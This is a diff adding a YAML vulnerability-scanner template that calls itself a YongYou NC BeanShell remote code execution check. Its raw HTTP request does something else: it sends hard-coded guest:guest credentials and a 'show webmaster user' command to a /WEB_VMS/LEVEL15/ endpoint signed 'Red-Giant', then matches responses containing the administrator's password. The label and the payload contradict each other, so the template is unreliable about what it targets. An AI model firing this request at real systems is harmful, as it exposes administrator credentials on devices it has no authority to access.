@@ -1,0 +1,26 @@
+id: poc-yaml-yongyou-nc-bsh-rce
+info:
+  name: YongYou NC BeanShell Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - raw:
+      - |
+        POST /WEB_VMS/LEVEL15/ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
+
+        command=show+webmaster+user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "webmaster level"
+      - type: word
+        part: body
+        words:
+          - "password"
